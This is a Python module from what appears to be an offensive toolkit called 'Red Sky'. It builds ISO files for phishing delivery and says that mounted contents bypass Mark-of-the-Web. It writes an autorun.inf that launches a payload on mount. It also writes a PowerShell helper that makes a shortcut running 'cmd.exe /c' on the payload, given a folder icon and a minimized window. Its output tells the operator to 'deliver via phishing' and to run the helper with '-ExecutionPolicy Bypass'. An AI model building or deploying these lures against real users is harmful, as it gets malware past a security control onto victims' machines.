# language: Python, file: Program/payload/iso.py, target: Red Sky payload — ISO builder
# Build ISO/IMG files. Contents of mounted ISOs bypass Mark-of-the-Web — a
# common phishing delivery bypass. Uses genisoimage/mkisofs if available,
# falls back to a minimal ISO builder.

import shutil
import subprocess
import sys
from pathlib import Path
from typing import List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet
from Program.utils.paths import OUTPUT_DIR


def _find_tool() -> str:
    for t in ("genisoimage", "mkisofs", "xorriso"):
        if shutil.which(t):
            return t
    return ""


def _build_autorun_lnk(lnk_target: str) -> str:
    """Autorun.inf that runs the payload on mount (legacy, but some OSes honor it)."""
    return f"""[autorun]
open={lnk_target}
action=Open folder to view files
"""


def _build_lnk_helper_ps(payload_name: str) -> str:
    """PowerShell that creates a .lnk pointing to the payload — the LNK has
    a command line that runs cmd.exe with the payload as argument."""
    return f'''
$ws = New-Object -ComObject WScript.Shell
$sc = $ws.CreateShortcut("payload.lnk")
$sc.TargetPath = "cmd.exe"
$sc.Arguments = "/c {payload_name}"
$sc.WindowStyle = 7
$sc.IconLocation = "%SystemRoot%\\System32\\shell32.dll,1"
$sc.Save()
'''


def cmd_build(src_dir: str, out_iso: str, label: str = "DATA") -> int:
    src = Path(src_dir).expanduser().resolve()
    if not src.exists() or not src.is_dir():
        print_err(f"source directory not found: {src}")
        return 1

    out = Path(out_iso).expanduser().resolve()
    out.parent.mkdir(parents=True, exist_ok=True)

    tool = _find_tool()
    if not tool:
        print_err("no ISO tool found. install one:")
        print_info("  sudo apt install genisoimage")
        return 1

    print_info(f"building ISO from {src}")
    print_kv("tool", tool)
    print_kv("label", label)
    print_kv("out", out)

    if tool == "xorriso":
        cmd = [tool, "-as", "mkisofs", "-V", label, "-o", str(out), str(src)]
    else:
        # genisoimage / mkisofs — use Joliet + Rock Ridge, no ISO level 4 restrictions
        cmd = [
            tool,
            "-V", label,
            "-J", "-R",            # Joliet + Rock Ridge extensions
            "-joliet-long",         # long filenames
            "-iso-level", "3",      # allow large files
            "-o", str(out),
            str(src),
        ]

    try:
        subprocess.run(cmd, check=True)
    except subprocess.CalledProcessError as e:
        print_err(f"{tool} failed: {e}")
        return 1

    size_mb = out.stat().st_size / (1024 * 1024)
    print_ok(f"ISO built ({size_mb:.2f} MB)")
    print()
    print_info("deliver via phishing — when the victim mounts the ISO, contents")
    print_info("are trusted (no Mark-of-the-Web). They run payload.lnk manually.")
    return 0


def cmd_scaffold(out_dir: str, payload: str) -> int:
    """Create a ready-to-build directory with autorun.inf, payload.lnk, payload."""
    d = Path(out_dir).expanduser().resolve()
    d.mkdir(parents=True, exist_ok=True)

    payload_name = Path(payload).name
    if Path(payload).exists():
        shutil.copy2(payload, d / payload_name)

    (d / "autorun.inf").write_text(_build_autorun_lnk(payload_name))
    (d / "make_lnk.ps1").write_text(_build_lnk_helper_ps(payload_name))
    (d / "README.txt").write_text("Open this folder to view files.")

    print_info(f"scaffolded ISO source at {d}")
    print_kv("payload", payload_name)
    print()
    print_info("to finish, on Windows:")
    print(f"  {ASH}powershell -ExecutionPolicy Bypass -File make_lnk.ps1{RESET}")
    print_info("or create payload.lnk manually pointing to:")
    print(f"  {ASH}cmd.exe /c {payload_name}{RESET}")
    print()
    print_info("then build with:")
    print(f"  {ASH}redsky payload iso build {d} {d}.iso{RESET}")
    return 0


def run_cli(args: List[str]) -> int:
    if not args:
        print_err("usage: redsky payload iso <build|scaffold> <src_dir_or_out> [args]")
        return 2

    sub = args[0]
    if sub == "build":
        if len(args) < 3:
            print_err("build needs: <src_dir> <out.iso> [label]")
            return 2
        return cmd_build(args[1], args[2], args[3] if len(args) > 3 else "DATA")
    if sub == "scaffold":
        if len(args) < 3:
            print_err("scaffold needs: <out_dir> <payload_path>")
            return 2
        return cmd_scaffold(args[1], args[2])
    print_err(f"unknown iso action: {sub}")
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
